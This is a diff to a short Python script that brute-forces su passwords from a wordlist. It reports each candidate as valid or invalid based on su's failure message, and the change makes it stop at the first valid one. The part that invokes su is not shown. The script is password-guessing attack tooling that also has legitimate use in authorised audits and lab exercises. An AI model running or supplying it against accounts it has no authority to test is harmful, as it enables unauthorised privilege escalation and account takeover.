@@ -1,12 +1,13 @@
+#!/bin/env python3
+
 from os.path import exists
 import argparse
 import subprocess
 
-FAIL = b'Password: \r\nsu: Authentication failure'
-FILE = './list.txt'
 
 parser = argparse.ArgumentParser(description='Check su passwords', usage='%(prog)s --wordlist=<wordlist>')
 parser.add_argument('--wordlist', help='password list to try', required=True)
+#parser.add_argument('--single', help='try a single password', required=True)
 args = parser.parse_args()
 inputFile = args.wordlist
 
@@ -30,11 +31,13 @@ def validate_pass(passwd):
 
 #passwd = getpass.getpass(prompt='Password: ', stream=None)
 def verify(passwd):
+  FAIL = b'Password: \r\nsu: Authentication failure'
   res = validate_pass(passwd).strip()
   if FAIL == res:
     print (passwd.strip() + ":Invalid password")
   else:
     print (passwd.rstrip() + ":Valid password")
+    exit()
 
 def main():
   passFile = check_exists(inputFile)
